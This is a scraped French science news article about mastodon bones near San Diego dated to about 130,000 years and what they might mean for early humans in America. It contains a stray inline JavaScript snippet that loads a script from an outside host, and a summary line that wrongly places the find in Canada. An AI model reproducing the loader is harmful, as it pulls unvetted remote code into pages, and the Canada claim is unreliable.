{"title": "Arrivee des premiers Hommes en Amerique du Nord : la decouverte qui remet tout en cause", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-04-28", "content": "Aussi incroyable que cela puisse paraitre, l'Homme aurait ete deja present en Amerique, du moins pres de la cote californienne, il y a environ 130.000 ans. Jusqu'a present, les recherches avancaient prudemment les chiffres de 13.000, voire 14.000 ans pour l'arrivee des premiers colons. Ce sont des traces sur des ossements d'un mastodonte qui ont mis des chercheurs sur cette piste. Ce qu'il faut retenir Des ossements de mastodontes casses par des outils ont ete retrouves au Canada et datent de 130.000 ans. Cette datation recule l'apparition de l'Homme en Amerique du Nord de plus de 100.000 ans par rapport a ce qui etait suppose. Aucun ossement humain n'ayant ete retrouve, il n'est pas certain que les homonides qui ont tue, ou depece, ce mastodonte, etaient des  Homo sapiens . A quand remonte l'arrivee des premiers Hommes en Amerique du Nord ? Voici deux semaines, une  decouverte  proposait, sur la foi d'outils et de morceaux de  charbon  retrouves dans le sol d'une petite ile au large de la Colombie-Britannique (Canada), qu'elle date de 14.000 ans, soit un peu plus tot que ce que d'autres recherches supposaient. Une nouvelle etude publiee en ligne dans la revue  Nature  balaie ces datations et va beaucoup plus loin, arguant que des individus du genre  Homo  etaient deja presents en Amerique, plus de 100.000 annees auparavant. Stupefiant ! Leurs auteurs reconnaissent qu'ils etaient eux-memes sceptiques dans un premier temps mais leur enquete, nourrie de reconstitutions et de datations  solides  a l' uranium , suggere avec force que ce sont des Hommes qui ont depece, il y a environ 130.000 ans (oui ! 130.000 ans), ce  mastodonte  dont les restes ont ete trouves pres de San Diego, en Californie.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Un etrange tas d'ossements La decouverte des os de cet animal du  Pleistocene  remonte au debut des annees 1990, lors de la construction d'une autoroute pres de la ville de San Diego. Elle avait beaucoup frappe les paleontologues venus sur place, parmi lesquels Richard Cerutti du Musee d'histoire naturelle de la ville, et dont le nom a ete donne a ce site. Mais des enigmes demeuraient : la disposition des os, les marques qu'ils presentent et, sous ce tas, la presence de grosses pierres montrant des traces d'usures... intriguaient.  << Les os ont ete positionnes d'une facon tout a fait inhabituelle , a declare Thomas Demere, auteur principal des recherches.  Par exemple, une defense a ete positionnee verticalement. Les tetes de  femur  ont ete trouvees cote a cote dans des amas tres distincts, et les os ont ete fractures de maniere en spirale, ce qui nous a amenes a croire que des humains ont du traiter ces os de mastodonte >> . Enfin,  << les processus geologiques qui avaient depose peu a peu le  limon  qui recouvrait les os ne pouvaient pas avoir aussi transporte jusqu'ici ces gros cailloux >> .  Selon les chercheurs, ces pierres ont pu servir a casser et a fendre les os du  mastodonte . De part et d'autre, a la fois comme marteau et comme enclume. Pour etayer leur hypothese, ils ont essaye par eux-memes de depecer le cadavre d'un elephant avec cette technique. Les memes types de marques ont ete obtenus avec des os encore couverts de chair.  << Nous avons produit exactement les memes motifs de fracture que nous voyons sur ces os de membres du mastodonte >> , a indique Steven Holen, un archeologue du  Centre for American Paleolithic Research . Gros plan sur l'un des femurs du mastodonte. (c) Tom Demere,  San Diego Natural History Museum                               Une datation irrefutable La possibilite que les traces aient ete creees par les engins de construction a ete eliminee. Idem pour celle proposant qu'elles aient ete produites par la machoire d'un  carnivore , ou encore par des pietinements d'animaux. Que des  hominides  se servent d'outils tels que ceux-la n'etonne pas les chercheurs. Il existe en effet des temoignages que nos ancetres en Afrique en fabriquaient deja il y a 1,5 million d'annees. Pour la datation, l'equipe s'est donc appuyee sur ces ossements. Pour eux, il etait clair qu'ils etaient anterieurs a 15.000 ans, etant donne les conditions geologiques du site de Cerruti. Comme les tentatives avec le radiocarbone ont echoue, faute de  collagene , ils s'en sont remis a James Paces, un expert en datation a l'uranium a la  US Geological Survey . Celui-ci a utilise la methode dite de << desequilibre de la serie uranium >> ( uranium series disequilibrium dating ). Il etait sceptique lui aussi a la vue des resultats, comme il l'a explique au cours de la conference de presse, mais toutes ses verifications concluaient a chaque fois a une moyenne de 130.000 ans, plus ou moins 9.000 ans. C'est donc une decouverte majeure qui, si elle est corroboree par d'autres a l'avenir, va obliger les archeologues et les paleoanthropologues a reecrire l'histoire des  premiers colons d'Amerique . Bien sur, cela pose de nombreuses et passionnantes questions : qui etaient-ils ? Des neandertaliens, des denisoviens... ? Des  Homo sapiens  archaiques ? Combien etaient-ils ? Quels chemins ont-ils pu emprunter ?... Par la  terre  ?,  via  le  corridor  du detroit de Bering a l'Alaska, ou par la mer, grace a des embarcations... ? << Ce qui est certain, c'est que les archeologues examineront maintenant les depots anterieurs en Amerique du Nord avec un plus grand interet >> , a commente Matt Pope, de l' Institute of Archaeology  de l' University College  de Londres. Interview 3/5 : l'Afrique, berceau de l'humanite ?                       L'Afrique est-elle le berceau de l'humanite ? Au vu des dernieres decouvertes on pourrait en douter. Nous avons rencontre Silvana Condemi, paleoanthropologue, pour tenter de clarifier cette enigme. Decouvrez sa reponse en video.                                       ", "theme": "planete"}